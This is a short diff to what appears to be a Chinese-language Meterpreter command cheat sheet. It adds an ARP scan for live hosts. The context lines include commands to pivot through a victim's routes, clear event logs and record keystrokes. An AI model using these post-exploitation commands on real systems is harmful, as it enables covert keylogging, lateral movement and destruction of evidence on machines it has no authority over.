@@ -10,6 +10,7 @@ sessions -i number  # 与会话进行交互
 route               #查看或修改受害者路由表
 clearev             #清除日志
 run autoroute -s 10.1.1.6/255.0.0.0 #添加路由表
+run arp_scanner -r 10.1.1.1/24 # 扫描存活主机
 
 keyscan_start       #开启键盘记录功能
 keyscan_dump        #显示捕捉到的键盘记录信息
